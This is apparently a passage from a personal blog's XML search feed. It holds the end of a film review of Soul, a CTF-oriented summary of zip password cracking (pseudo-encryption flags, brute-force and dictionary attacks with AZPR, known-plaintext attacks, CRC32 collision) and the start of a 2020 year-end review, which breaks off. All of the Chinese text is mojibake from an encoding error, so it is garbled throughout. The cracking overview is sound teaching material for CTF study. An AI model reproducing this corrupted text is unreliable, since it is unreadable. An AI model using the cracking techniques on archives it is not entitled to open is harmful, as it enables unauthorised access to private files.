é¡ºåˆ©åœ°ç™»å°æ¼”å‡ºå¹¶ä¸”æ¼”å‡ºæ•ˆæœå¾ˆå¥½ï¼Œè®©å¶åƒã€æ¯äº²å’Œè§‚ä¼—éƒ½èµä¸ç»å£ï¼Œå¯æ˜¯å½“ Joe å®Œæˆäº†è¿™åœºæ¼”å‡ºåå´æ„Ÿå—åˆ°äº†ç©ºè™šï¼Œæ²¡æœ‰æƒ³è±¡ä¸­çš„é‚£ä¹ˆå¼€å¿ƒï¼Œä»¿ä½›ä¸ºäº†è¿™ä¸€å¤©ä»–å·²ç»ç­‰äº†ä¸€è¾ˆå­ï¼Œä»–ä»¥ä¸ºä»–çš„æ„Ÿå—ä¼šæœ‰æ‰€ä¸åŒï¼Œå¯ç»“æœå‘ç°ï¼Œå°±è¿™ï¼Ÿ</p><p>é‚£ä¹ˆ Joe åˆ°åº•æƒ³è¦ä»€ä¹ˆå‘¢ï¼Ÿæ˜¯è¿½é€æ¢¦æƒ³æˆä¸ºæ¼”å¥å®¶ï¼Œè¿˜æ˜¯å¾—åˆ°å¶åƒã€æ¯äº²çš„è®¤å¯ï¼Œè¿˜æ˜¯è¯æ˜è‡ªå·±ï¼Ÿçœ‹åˆ°è¿™é‡Œçš„æ—¶å€™ï¼Œæˆ‘ä¹Ÿåœ¨é—®è‡ªå·±ï¼Œè‡ªå·±çš„ç›®æ ‡å’Œæ¢¦æƒ³æ˜¯ä»€ä¹ˆï¼Œæˆ‘æƒ³è¦ä»€ä¹ˆæ ·çš„äººç”Ÿï¼Œç”Ÿæ´»çš„æ„ä¹‰åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿ</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/v2-cedba7aa378a5513ee688f6b6ed0057f_720w.jpg"></p><p><strong>æˆ‘æƒ³ä¸å‡ºç­”æ¡ˆï¼Œç”µå½±ä¹Ÿæ²¡æœ‰ç»™å‡ºç­”æ¡ˆï¼Œæ¢å¥è¯è¯´ï¼Œæ„Ÿè§‰è¿™äº›é—®é¢˜ï¼Œæ ¹æœ¬å°±æ²¡æœ‰ç­”æ¡ˆã€‚</strong></p><p>22å·è§‰å¾—è‡ªå·±çš„ç«èŠ±æ˜¯çœ‹å¤©ç©ºæˆ–è€…èµ°è·¯ï¼Œä½† Joe å´å¦å®šå®ƒï¼Œè¯´é‚£åªæ˜¯å¹³å‡¡çš„æ´»ç€è€Œå·²ï¼Œä¸æ˜¯ä»€ä¹ˆäººç”Ÿç›®æ ‡ã€‚ç­‰åˆ° Joe åœ¨å®¶æ‹¿å‡º22å·åœ¨åœ°çƒæ”¶é›†çš„æŠ«è¨ã€æ£’æ£’ç³–ã€ç”œç”œåœˆã€é’ˆçº¿å’Œæ ‘å¶æ—¶ï¼Œæ‰æç„¶å¤§æ‚Ÿï¼Œå…¶å®äººç”Ÿæ ¹æœ¬ä¸éœ€è¦é‚£ä¹ˆæ¸…æ™°æ˜ç¡®çš„ç›®æ ‡ï¼Œç”Ÿæ´»ä¸­é‚£äº›å¹³å‡¡çš„æ—¶åˆ»ï¼Œæ‰æ„æˆäº†æˆ‘ä»¬å®Œæ•´çš„çµé­‚ã€‚</p><p>ä»”ç»†æƒ³æƒ³ï¼Œè¿™æ®µæ—¶é—´ä»¥æ¥çœŸçš„å¤ªç„¦è™‘äº†ï¼Œè‡ªå·±ç»™è‡ªå·±çš„å‹åŠ›å®åœ¨æ˜¯å¤ªå¤§ï¼Œç”šè‡³å¯ä»¥è¯´ï¼Œå¯¹è‡ªå·±å¤ªè‹›è´£äº†ï¼Œè€æ˜¯å¿™ç€å­¦ä¹ ï¼Œå¿™ç€å·¥ä½œï¼Œå¿™ç€è¿½æ¢¦ï¼Œå´å¸¸å¸¸å¿˜è®°äº†ä¸ºä»€ä¹ˆè¦è¿™æ ·åšã€‚æ‰€ä»¥æˆ‘è®¤ä¸ºä¸€ä¸ªå¥½çš„çŠ¶æ€åº”è¯¥æ˜¯äº«å—å­¦ä¹ ï¼Œäº«å—å·¥ä½œï¼Œäº«å—è¿½æ¢¦ï¼ŒçœŸå®çš„äº«å—å…¶ä¸­çš„æ¯ä¸€åˆ»ã€‚</p><p>ç¬¬ä¸‰ä¸ªæƒ…èŠ‚æ˜¯ç”µå½±é‡Œé‚£ä¸ªå—äººæ¬¢è¿çš„ç†å‘å¸ˆï¼Œä»–å¹´è½»æ—¶å€™çš„æ¢¦æƒ³æ˜¯å½“å…½åŒ»ï¼Œåæ¥å› ä¸ºå¦»å­å»ä¸–æ²¡é’±ä¸Šå…½åŒ»åŸ¹è®­ç­å°±å»äº†ç†å‘åŸ¹è®­ç­ï¼Œæœ€åæˆä¸ºäº†ä¸€ä¸ªç†å‘å¸ˆã€‚å½“22å·åŒæƒ…ä»–çš„æ—¶å€™ï¼Œä»–å´è¯´ï¼šâ€é‚£ä¹Ÿä¸èƒ½è¿™ä¹ˆè¯´ã€‚æˆ‘ç°åœ¨ä¹Ÿå¾ˆå¥½ã€‚â€ä»–çš„æ‰‹è‰ºå¾ˆç²¾æ¹›ï¼Œå¯¹é¡¾å®¢å¾ˆçƒ­æƒ…ï¼Œä¹Ÿå–œæ¬¢ç°åœ¨çš„å·¥ä½œï¼Œå¾ˆå¤šäººéƒ½å–œæ¬¢ä»–ã€‚</p><p>æˆ‘è§‰å¾—è¿™æ˜¯ç†å‘å¸ˆå’Œè‡ªå·±å’Œè§£äº†ï¼Œæ²¡æœ‰å®ç°æ¢¦æƒ³çš„äººï¼Œåœ¨å¾ˆç°å®çš„ç”Ÿæ´»é‡Œæ‰¾åˆ°äº†æ–°çš„æ„ä¹‰ï¼Œæˆ–è€…è¯´æ–°çš„æ¢¦æƒ³ï¼Œ<strong>æ²¡æœ‰ä¹‹å‰çš„æ¢¦æƒ³é‚£ä¹ˆé¥è¿œï¼Œä½†æ˜¯æœ‰äº†ç”Ÿæ´»çš„çƒ­æƒ…ï¼Œä¹Ÿå’Œå¹³å‡¡çš„è‡ªå·±è¾¾æˆäº†å’Œè§£ï¼Œæ¥å—äº†è‡ªå·±çš„å¹³å‡¡ï¼Œä¹ŸåŒæ—¶è®©è‡ªå·±å˜å¾—ä¸å¹³å‡¡ã€‚</strong></p><p><strong>å¥½å¥½çæƒœç”Ÿæ´»ä¸­çš„æ¯ä¸€åˆ†é’Ÿï¼Œå¥½å¥½çæƒœèº«è¾¹çš„äººï¼Œä¸ç•™é—æ†¾ã€‚</strong></p>]]></content>
      
      
      <categories>
          
          <category> è¯»åæ„Ÿå’Œè§‚åæ„Ÿ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è§‚åæ„Ÿ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zipå‹ç¼©åŒ…åŠ å¯†ç ´è§£æ€»ç»“</title>
      <link href="/posts/64572/"/>
      <url>/posts/64572/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢</p><p>å‰å‡ å¤©åœ¨æŸä¸ª CTF çš„äº¤æµç¾¤æƒ³çœ‹çœ‹å¤§ä½¬ä»¬éƒ½åœ¨èŠä»€ä¹ˆï¼Œå¶ç„¶é—´çœ‹åˆ°æœ‰äººå‘äº†ä¸€ä¸ª pdf ï¼ˆå°±æ˜¯è¿™ç¯‡æ–‡ç« ï¼‰ï¼Œä¸€å¼€å§‹é¡ºæ‰‹ç‚¹ä¸‹è½½ä¸‹æ¥æ²¡æ€ä¹ˆçœ‹ï¼Œè¿‡å‡ å¤©æ‰“å¼€çœ‹äº†ä¸€ä¸‹å‘ç°å†™å¾—æŒºå¥½çš„ï¼Œè¿™ç¯‡æ–‡ç« åº”è¯¥æ˜¯ä¸€ä¸ªå¤§ä½¬çš„åšå®¢é‡Œçš„æ–‡ç« ï¼Œä½†æ˜¯å°è¯•å»æ‰¾åˆ°å¤§ä½¬çš„åšå®¢åœ°å€å´ä¸€ç›´æ²¡æœ‰æ‰¾åˆ°ï¼Œå¾ˆé—æ†¾ QAQ</p></blockquote><p>[TOC]</p><h1 id="ä¼ªåŠ å¯†ã€çˆ†ç ´ã€æ˜æ–‡æ”»å‡»å’ŒCRC32ç¢°æ’"><a href="#ä¼ªåŠ å¯†ã€çˆ†ç ´ã€æ˜æ–‡æ”»å‡»å’ŒCRC32ç¢°æ’" class="headerlink" title="ä¼ªåŠ å¯†ã€çˆ†ç ´ã€æ˜æ–‡æ”»å‡»å’ŒCRC32ç¢°æ’"></a>ä¼ªåŠ å¯†ã€çˆ†ç ´ã€æ˜æ–‡æ”»å‡»å’ŒCRC32ç¢°æ’</h1><ul><li><p>zip æ–‡ä»¶æ ¼å¼ï¼š</p><p>zip æ–‡ä»¶ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼šå‹ç¼©çš„æ–‡ä»¶å†…å®¹æºæ•°æ®ã€å‹ç¼©çš„ç›®å½•å…ƒæ•°æ®ã€ç›®å½•ç»“æŸæ ‡è¯†ç»“æ„</p></li></ul><h2 id="ä¼ªåŠ å¯†"><a href="#ä¼ªåŠ å¯†" class="headerlink" title="ä¼ªåŠ å¯†"></a>ä¼ªåŠ å¯†</h2><ul><li>å¦‚æœæ˜¯æ²¡æœ‰åŠ å¯†çš„ zip æ–‡ä»¶ï¼Œå‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºå’Œå‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºçš„<code>å…¨å±€æ–¹å¼ä½æ ‡è®°</code>éƒ½ä¸º<code>00 00</code></li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210113190707.png"></p><ul><li>å¦‚æœæ˜¯çœŸæ­£åŠ å¯†çš„ zip æ–‡ä»¶ï¼Œå‹ç¼©æºæ–‡ä»¶æ•°æ®åŒºå’Œå‹ç¼©æºæ–‡ä»¶ç›®å½•åŒºçš„<code>å…¨å±€æ–¹å¼ä½æ ‡è®°</code>éƒ½ä¸º<code>09 00</code><ul><li>ä¸åŒçš„å‹ç¼©è½¯ä»¶æœ‰å·®å¼‚ï¼Œæœ‰äº›è½¯ä»¶çš„å…¨å±€æ–¹å¼ä½æ ‡è®°æ˜¯<code>01 00</code></li></ul></li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210113190951.png"></p><ul><li>å¦‚æœå°†æœªåŠ å¯†çš„ zip æ–‡ä»¶ä¸­çš„<code>å‹ç¼©æºæ–‡ä»¶ç›®å½•åŒº</code>çš„å…¨å±€æ–¹å¼ä½æ ‡è®°æ”¹ä¸º<code>01 00</code>ï¼ˆæˆ–è€…<code>09 00</code>ï¼‰ï¼Œå°±ä¼šè¢«å‹ç¼©è½¯ä»¶è®¤å®šä¸ºæ˜¯å·²åŠ å¯†ï¼Œè¿™å°±æ˜¯<code>ä¼ªåŠ å¯†</code>çš„åŸç†</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210113191315.png"></p><blockquote><p>å¦‚ä½•ç ´è§£ä¼ªåŠ å¯†ï¼Ÿ</p><p>1ã€æŠŠå‹ç¼©æ–‡ä»¶ç›®å½•åŒºçš„å…¨å±€æ–¹å¼æ ‡è®°æ”¹å›<code>00 00</code></p><p>2ã€<code>kali</code> å’Œ <code>360å‹ç¼©</code> èƒ½å¤Ÿç›´æ¥æ‰“å¼€ä¼ªåŠ å¯†å‹ç¼©åŒ…</p></blockquote><h2 id="çˆ†ç ´"><a href="#çˆ†ç ´" class="headerlink" title="çˆ†ç ´"></a>çˆ†ç ´</h2><ul><li>çˆ†ç ´å°±æ˜¯é€ä¸ªå°è¯•å­—å…¸ä¸­çš„å¯†ç å»å¯¹å‹ç¼©åŒ…è¿›è¡Œè§£å¯†ï¼Œå¤§æ¦‚åˆ†ä¸º<code>æš´åŠ›ç ´è§£</code>ã€<code>æ©ç ç ´è§£</code>ã€<code>å­—å…¸ç ´è§£</code>ä¸‰ç§</li></ul><ol><li>æš´åŠ›ç ´è§£ï¼šé€‰æ‹©å¯†ç çš„èŒƒå›´ã€é•¿åº¦ç­‰ï¼Œç”±è½¯ä»¶ç»„åˆç”Ÿæˆçš„å¯†ç è¿›è¡Œç ´è§£</li><li>æ©ç ç ´è§£ï¼šçŸ¥é“å¯†ç ä¸­çš„ä¸€éƒ¨åˆ†ï¼Œåªéœ€è¦æŒ‰ç…§è§„åˆ™æ„é€ å…¶ä»–éƒ¨åˆ†è¿›è¡Œç ´è§£</li><li>å­—å…¸ç ´è§£ï¼šé€šå¸¸æ˜¯ç”¨æˆ·æ€»ç»“å‡ºæ¥çš„å¸¸ç”¨çš„å¯†ç å­—å…¸ï¼Œå¯¼å…¥å­—å…¸æ–‡ä»¶ç”¨å­—å…¸ä¸­çš„å¯†ç è¿›è¡Œç ´è§£ï¼Œå¼ºåº¦å–å†³äºæ¯ä¸ªäººçš„å­—å…¸å¼ºåº¦</li></ol><ul><li>çˆ†ç ´å¸¸ç”¨å·¥å…·æ˜¯ Windows çš„è½¯ä»¶ <code>AZPR</code>ï¼Œä¹Ÿå¯ä»¥è‡ªå·±åŠ¨æ‰‹å†™ py è„šæœ¬æ¥çˆ†ç ´</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210114102225.png"></p><h2 id="å·²çŸ¥æ˜æ–‡æ”»å‡»"><a href="#å·²çŸ¥æ˜æ–‡æ”»å‡»" class="headerlink" title="å·²çŸ¥æ˜æ–‡æ”»å‡»"></a>å·²çŸ¥æ˜æ–‡æ”»å‡»</h2><ul><li>å·²çŸ¥æ˜æ–‡æ”»å‡»ï¼šæ”»å‡»è€…å·²çŸ¥æ˜æ–‡ã€å¯†æ–‡åŠç®—æ³•ï¼Œæ±‚å¯†é’¥çš„è¿‡ç¨‹</li><li>æ˜æ–‡æ”»å‡»æ˜¯ä¸€ä¸ªé«˜æ•ˆçš„æ”»å‡»æ‰‹æ®µï¼Œæ¯”å¦‚å½“ä½ ä¸çŸ¥é“ä¸€ä¸ª zip å‹ç¼©åŒ…æ–‡ä»¶çš„å¯†ç ï¼Œä½†æ˜¯ä½ æœ‰ zip åŒ…ä¸­çš„ä¸€ä¸ªå·²çŸ¥æ–‡ä»¶ï¼ˆ<code>æ–‡ä»¶å¤§å°è¦å¤§äº12Byte</code>ï¼‰æ—¶ï¼Œå› ä¸ºåŒä¸€ä¸ª zip å‹ç¼©åŒ…é‡Œçš„æ‰€æœ‰å‹ç¼©æ–‡ä»¶ä½¿ç”¨çš„æ˜¯åŒä¸€ä¸ªåŠ å¯†å¯†é’¥æ¥åŠ å¯†çš„ï¼Œæ‰€ä»¥å¯ä»¥ç”¨å·²çŸ¥æ–‡ä»¶æ¥æ‰¾åŠ å¯†å¯†é’¥ï¼Œåˆ©ç”¨å¯†é’¥æ¥è§£é”å…¶ä»–åŠ å¯†æ–‡ä»¶</li><li>ç®€å•æ¥è¯´ï¼Œå°±æ˜¯åˆ©ç”¨å·²çŸ¥æ–‡ä»¶æ¨ç†çˆ†ç ´å‡ºåŠ å¯†æ‰€ç”¨å¯†é’¥ï¼Œåˆ©ç”¨è¿™ä¸ªå¯†é’¥æ¥è§£å¯†å…¶ä»–æ–‡ä»¶</li></ul><p>ä¸¾ä¸ªæ —å­ï¼š</p><p>ç°åœ¨æˆ‘å‹ç¼©äº†å¸¦å¯†ç çš„å››ä¸ªæ–‡ä»¶ï¼Œå·²çŸ¥æ˜æ–‡ æ”»å‡»æµ‹è¯•.zip ä¸­çš„ æ˜æ–‡æ”»å‡».docx</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210114102721.png"></p><p>è¿›è¡Œå¯¹å·²çŸ¥æ–‡ä»¶è¿›è¡Œå‹ç¼©ï¼Œå¯¹æ¯”<code>crcå€¼</code>æ˜¯å¦è·ŸåŠ å¯†æ–‡ä»¶ä¸­çš„<code>crcå€¼</code>ä¸€æ ·</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210114102819.png"></p><p>åŒæ ·æ˜¯åˆ©ç”¨è½¯ä»¶<code>AZPR</code>è¿›è¡Œæ˜æ–‡æ”»å‡»ï¼ŒæˆåŠŸè·å–åˆ°å¯†æ–‡</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210114102922.png"></p><blockquote><p>æ³¨æ„ï¼šå½“æ˜æ–‡çš„å¤§å°æ¯”è¾ƒå°æ—¶ï¼Œæˆ–è€…å¯†æ–‡è¿‡é•¿ï¼Œæ”»å‡»é€Ÿåº¦ä¼šæ¯”è¾ƒæ…¢ï¼›å³ä½¿æœ‰æ—¶æ²¡æœ‰æ¢å¤å¯†ç ï¼Œä¹Ÿå¯ä»¥ä½¿ ç”¨æ˜æ–‡æ”»å‡»ï¼Œæœ€åç‚¹ä¿å­˜è¿˜æ˜¯èƒ½å¾—åˆ°å‹ç¼©åŒ…é‡Œå†…å®¹çš„ï¼Œå¦‚æœå‡ºç°é”™è¯¯å¯ä»¥å¤šè¯•å‡ æ¬¾å‹ç¼©è½¯ä»¶</p></blockquote><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20210114103239.png"></p><h2 id="CRC32ç¢°æ’"><a href="#CRC32ç¢°æ’" class="headerlink" title="CRC32ç¢°æ’"></a>CRC32ç¢°æ’</h2><ul><li>CRC32ï¼šCRC æœ¬èº«æ˜¯â€œå†—ä½™æ ¡éªŒç â€çš„æ„æ€ï¼ŒCRC32 æ ‡è¯†åˆ™ä¼šäº§ç”Ÿä¸€ä¸ª 32bit ï¼ˆ8 ä½ 16 è¿›åˆ¶ï¼‰çš„æ ¡éªŒå€¼</li><li>CRCæ ¡éªŒå®ç”¨ç¨‹åºåº“ï¼Œåœ¨æ•°æ®å­˜å‚¨å’Œæ•°æ®é€šè®¯é¢†åŸŸï¼Œä¸ºäº†ä¿è¯æ•°æ®çš„æ­£ç¡®ï¼Œå°±ä¸å¾—ä¸é‡‡ç”¨æ£€é”™çš„æ‰‹æ®µï¼Œåœ¨è¯¸å¤šæ£€é”™æ‰‹æ®µä¸­ï¼ŒCRC æ˜¯æœ€è‘—åçš„ä¸€ç§ï¼ŒCRC çš„å…¨ç¨‹æ˜¯<code>å¾ªç¯å†—ä½™æ ¡éªŒ</code></li><li>åœ¨äº§ç”ŸCRC32 æ—¶ï¼Œæºæ•°æ®å—çš„æ¯ä¸€ä½éƒ½å‚ä¸äº†è¿ç®—ï¼Œå› æ­¤å³ä½¿æ•°æ®å—ä¸­åªæœ‰ä¸€ä½å‘ç”Ÿæ”¹å˜ä¹Ÿä¼šå¾—åˆ°ä¸åŒçš„CRC32 å€¼ï¼Œåˆ©ç”¨è¿™ä¸ªåŸç†å¯ä»¥ç›´æ¥çˆ†ç ´å‡ºåŠ å¯†æ–‡ä»¶ä¸­çš„å†…å®¹</li><li>æ¯ä¸ªæ–‡ä»¶éƒ½æœ‰å”¯ä¸€çš„CRC32 å€¼ï¼Œå³ä¾¿æ•°æ®ä¸­çš„ä¸€ä¸ª bit å‘ç”Ÿå˜åŒ–ï¼Œä¹Ÿä¼šå¯¼è‡´CRC32 å€¼ä¸åŒï¼Œè‹¥æ˜¯çŸ¥é“ä¸€æ®µæ•°æ®çš„é•¿åº¦å’ŒCRC32 å€¼ï¼Œä¾¿å¯ä»¥ç©·ä¸¾æ•°æ®ï¼Œä¸å…¶CRC32 å¯¹ç…§ï¼Œä»¥æ­¤è¾¾åˆ°æš´åŠ›ç ´è§£çš„ç›®çš„ï¼Œä½†æ˜¯é™äºCPUçš„æ€§èƒ½ï¼Œåªé€‚ç”¨äºè¾ƒå°æ–‡æœ¬æ–‡ä»¶</li></ul>]]></content>
      
      
      <categories>
          
          <category> hackæŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zipåŠ å¯†ç ´è§£ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020å¹´ç»ˆæ€»ç»“</title>
      <link href="/posts/41083/"/>
      <url>/posts/41083/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å†™åœ¨å‰é¢<br>2020æŒºä¸å®¹æ˜“çš„ï¼Œåšä¸ªæ€»ç»“å§</p></blockquote><hr><blockquote><p>2020.12.31 æ›´æ–°</p><p>è¿™ç¯‡æ–‡å†™äº†æœ‰å‡ å¤©ï¼Œæœ€åè¿˜æ˜¯æƒ³ç€ï¼ŒæŠŠæ˜å¹´çš„ç›®æ ‡å’ŒæœŸæœ›å†™åœ¨æ–‡ç« çš„æœ€å‰é¢ï¼Œç„¶åæŠŠæ–‡é¡¶ç½®ï¼Œä»¥åæ¯æ¬¡ç‚¹å¼€çœ‹åˆ°çš„éƒ½æ˜¯å»å¹´å¯¹è‡ªå·±æ–°çš„ä¸€å¹´çš„å±•æœ›ï¼Œåº”è¯¥ä¼šè›®æœ‰åŠ¨åŠ›çš„å§</p></blockquote><h1 id="2021"><a href="#2021" class="headerlink" title="2021"></a>2021</h1><ul><li><p><strong>å¥½å¥½åƒé¥­ï¼Œå¥½å¥½ä¸Šè¯¾ï¼Œå¥½å¥½ç¡è§‰ï¼ŒåŠ¡å¿…åšåˆ°</strong></p></li><li><p><strong>è½¬å‹äºŒè¿›åˆ¶é€‰æ‰‹ï¼Œwebä¹Ÿä¸èƒ½è½ä¸‹</strong></p></li><li><p><strong>å­¦ä¼šåšå¼€å‘ï¼å­¦ä¼šåšå¼€å‘ï¼å­¦ä¼šåšå¼€å‘ï¼ï¼ï¼</strong></p></li><li><p><strong>æé«˜å­¦ä¹ æ•ˆç‡ï¼Œå°½é‡å°‘ç†¬å¤œï¼Œä¸è¦å†å›°å€’åœ¨å•æ‰€é—¨å£çš„åƒåœ¾æ¡¶æ—è¾¹äº†</strong></p></li><li><p><strong>å¤šè¯»ä¹¦ï¼ŒåŒæ—¶ä¹Ÿè¦åšè¯»ä¹¦ç¬”è®°ï¼Œä¸ç„¶çœ‹äº†å°±å¿˜ï¼Œæ²¡ç”¨</strong></p></li><li><p><strong>äº‰å–å¤§äºŒæš‘å‡ç»“æŸå»æ‰¾ä¸ªå®ä¹ </strong></p></li><li><p><strong>å¤šæ‰“æ¯”èµ›ï¼Œäº‰å–å¤šæ‹¿å‡ ä¸ªå¥–ï¼Œäº‰å–è¿›ä¸€æ¬¡å¤§æ¯”èµ›çš„çº¿ä¸‹èµ›ï¼Œä¸¤æ¬¡ä¸‰æ¬¡æ›´å¥½ï¼</strong></p></li><li><p><strong>æŠ½ç‚¹æ—¶é—´å‡ºæ¥æ‰“æ¸¸æˆé™ªé™ªè‡ªå·±ï¼Œä¸è¦åªä¹°æ¸¸æˆä¸ç©æ¸¸æˆ</strong></p></li><li><p><strong>é”»ç‚¼èº«ä½“</strong></p></li></ul><blockquote><p>2020.12.27 æ›´æ–°</p></blockquote><hr><h1 id="ä¸ŠåŠå¹´"><a href="#ä¸ŠåŠå¹´" class="headerlink" title="ä¸ŠåŠå¹´"></a>ä¸ŠåŠå¹´</h1><hr><h2 id="å±…å®¶æ—¶æœŸ"><a href="#å±…å®¶æ—¶æœŸ" class="headerlink" title="å±…å®¶æ—¶æœŸ"></a>å±…å®¶æ—¶æœŸ</h2><p>2020 ä¸ŠåŠå¹´ä¸ç®¡å¯¹è°æ¥è¯´éƒ½å¾ˆä¸å®¹æ˜“ï¼Œå› ä¸ºç–«æƒ…çš„åŸå› ï¼Œä¸ŠåŠå¹´ä¸€ç›´åˆ°å››æœˆåº•äº”æœˆåˆéƒ½ä¸€ç›´æ˜¯å‘†åœ¨å®¶é‡Œçš„ï¼Œä¹Ÿåˆšå¥½æ˜¯å› ä¸ºä¸€ç›´åœ¨å®¶é‡Œé¢ï¼Œä¹Ÿé‡åˆ°äº†ä¸€ä¸ªå¾ˆç‰¹åˆ«çš„äºº</p><p>åœ¨å­¦ä¹ è·Ÿç”Ÿæ´»ä¸Šå¯¹è‡ªå·±æ˜¯ä¸æ»¡æ„çš„ï¼Œï¼ˆç°åœ¨åçœè‡ªå·±ï¼‰ï¼Œæœ¬æ¥å°±è‡ªå¾‹èƒ½åŠ›ä¸å¼ºï¼Œå­¦ä¹ èƒ½åŠ›ç›´çº¿ä¸‹é™ï¼Œæ‹–æ…¢äº†è‡ªå·±å¾ˆå¤šè¿›åº¦ï¼Œæœ¬æ¥æœ‰å¾ˆå¤šæƒ³å­¦çš„ä¸œè¥¿ï¼Œä¸€ç›´æ˜¯å› ä¸ºè‡ªå·±æ‡’æƒ°ã€æ‹–å»¶çš„æ¯›ç—…ï¼Œåœ¨å®¶çš„å‡ ä¸ªæœˆæ•ˆç‡å¾ˆä½ï¼Œç®—æµªè´¹äº†å‡ ä¸ªæœˆå§ï¼Œä¹Ÿä¸ºä¸‹åŠå¹´çš„ä¸€äº›é—æ†¾åšäº†ä¼ç¬”ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201231022028.png"></p><hr><h2 id="è¿”æ ¡"><a href="#è¿”æ ¡" class="headerlink" title="è¿”æ ¡"></a>è¿”æ ¡</h2><p>åœ¨å››æœˆåº•çš„æ—¶å€™ç»ˆäºè¿”æ ¡äº†ï¼Œè¿”æ ¡ä¹‹åå¾ˆæ˜æ˜¾çš„æ˜¯æ„Ÿè§‰å°±æ˜¯è¯¾ç¨‹å·²ç»è·Ÿä¸ä¸Šäº†ï¼Œæ‰€ä»¥å¾ˆå¤šé—¨è¯¾ï¼Œæ¯”å¦‚è¯´é«˜æ•°ã€å¤§ç‰©ã€çº¿ä»£ã€ç”µè·¯åˆ†æï¼Œéƒ½æ˜¯é çŒ´åšå£«åœ¨è€ƒå‰ä¸¤ä¸‰å¤©é€Ÿæˆçš„ï¼Œè¿™æ ·ä¸€æ¥ï¼Œè¿™å‡ é—¨è¯¾çš„æˆç»©éƒ½æ˜¯åœ¨78å·¦å³ï¼Œè¿˜æŒºä¸æ»¡æ„çš„</p><p>åœ¨æœŸæœ«çš„æ—¶å€™ï¼Œå‚åŠ äº†å­¦æ ¡é‡Œé¢çš„ä¸€ä¸ªæ ¡èµ›ï¼Œè·Ÿ sivona å¸ˆå‚…<del>æ­æ¡£</del>ï¼ˆè¢«å¸¦é£ï¼‰ï¼Œä¹Ÿæ˜¯å¾ˆè½»æ¾çš„æ‹¿åˆ°äº†åˆèµ›ã€çº¿ä¸‹èµ›çš„ä¸¤ä¸ªç¬¬ä¸€åï¼Œä¹Ÿä¸ºæˆ‘è½¬ä¸“ä¸šçš„äº‹æƒ…æ‹¿åˆ°äº†ç¬¬ä¸€å¼ å¥–çŠ¶ï¼Œç¬¬ä¸€æ¬¡æ‰“çº¿ä¸‹èµ›ï¼ŒçœŸçš„éå¸¸éå¸¸ç´§å¼ ï¼Œå¾ˆç®€å•å¾ˆç®€å•çš„é—®é¢˜åˆ°äº†ç°åœºå´ä¼šçŸ­è·¯å¾ˆä¹…ï¼Œè„‘è¢‹æœ‰è›®å¤šæ—¶å€™å®Œå®Œå…¨å…¨æ˜¯å®•æœºçš„ï¼Œæœ€ååªæ˜¯å¹²å‡ºæ¥ä¸€é“ web çš„ç­¾åˆ°é¢˜ï¼Œè¿˜æ˜¯æœ‰ç‚¹é—æ†¾çš„ï¼ˆå†æ¬¡æ„Ÿè°¢ sivona å¸ˆå‚…ä¸€è¡€äº†å‡ ä¸ª pwn é¢˜ï¼‰ã€‚ä¸è¿‡å‡¡äº‹éƒ½æœ‰ç¬¬ä¸€æ¬¡ï¼Œä¹Ÿç®—æ˜¯å¼€äº†ä¸€ä¸ªå¥½å¤´äº†ï¼Œæ‰“çº¿ä¸‹èµ›çš„æ„Ÿè§‰çœŸçš„å¾ˆä¸é”™ï¼Œèƒ½å¤Ÿæœ‰é‚£ç§è‚¾ä¸Šè…ºç´ æ‹‰æ»¡çš„æ„Ÿè§‰ã€‚</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201231025718.png"></p><p><img src="https://ftp.bmp.ovh/imgs/2020/12/fbdf63a3a5132aca.jpg" alt="åˆèµ›ç¬¬ä¸€"></p><p><img src="https://ftp.bmp.ovh/imgs/2020/12/072af2ff5ec16fdd.jpg" alt="çº¿ä¸‹ç¬¬ä¸€"></p><p><img src="https://ftp.bmp.ovh/imgs/2020/12/c71c973cb7fb5f50.jpg" alt="å¥–çŠ¶"></p><p>å›æ ¡ä¸€ä¸¤ä¸ªæœˆå°±æ”¾æš‘å‡äº†ï¼Œåä¼š16çº§çš„ä¸¤ä¸ªå­¦é•¿æ¯•ä¸šäº†ï¼Œè™½ç„¶å¾ˆèˆä¸å¾—ï¼Œä½†æ˜¯æ¯•ç«Ÿåœˆå­å¾ˆå°ï¼Œä»¥åæ±Ÿæ¹–å†è§ï¼Œ<del>å¸Œæœ›å†è§çš„æ—¶å€™ä¸æ˜¯æˆ‘è¢«æŠ“äº†</del></p><blockquote><p>é¹ç¥åœ£ç»ï¼š</p><p>æœ€åæ„Ÿè°¢æˆ‘çš„å¥³æœ‹å‹ï¼Œåœ¨æˆ‘å¤§å››æœŸé—´å§‹ç»ˆæ²¡æœ‰å‡ºç°ï¼Œè®©æˆ‘å¾—ä»¥ä¸“å¿ƒäºå­¦æœ¯ï¼Œé¡ºåˆ©å®Œæˆæœ¬ç§‘è®ºæ–‡</p><p>â€”â€”æ¯•ä¸šè®ºæ–‡è°¢è¾</p></blockquote><hr><h2 id="æš‘å‡"><a href="#æš‘å‡" class="headerlink" title="æš‘å‡"></a>æš‘å‡</h2><p>æš‘å‡çš„æ—¶å€™æœ‰å¹¸å»å‚åŠ äº†ä¸€æ¬¡ hw ï¼ŒåŒæ 